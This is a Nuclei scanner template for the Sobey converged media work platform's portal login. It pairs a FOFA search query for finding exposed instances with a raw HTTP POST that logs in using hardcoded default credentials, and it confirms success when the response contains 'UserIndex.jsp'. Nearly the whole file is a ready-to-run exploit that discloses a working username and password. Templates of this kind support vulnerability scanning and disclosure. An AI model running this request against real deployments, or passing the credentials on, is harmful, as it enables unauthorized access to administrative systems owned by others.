id: sobey-media-platform-weak-password

info:
  name: "索贝融媒体工作平台 portal 接口硬编码弱口令漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
    由于默认凭证未被修改，攻击者可利用硬编码的弱口令访问后台管理系统，进而执行未授权操作。
  tags: 索贝融媒体工作平台

http:
- raw:
  - |
    POST /portal/Login/login HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Cookie: JSESSIONID=C82C17A4696C2D077F7B0DCF90181FF9; lang=zh

    _BSP_REQ_DATA=%7B%22_BSP_ACTION%22%3A%22%2FLogin%2Flogin%22%2C%22UserName%22%3A%22sobey%22%2C%22Password%22%3A%22Sobeyhive-2016%22%2C%22siteCode%22%3A%22S1%22%7D
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'UserIndex.jsp'
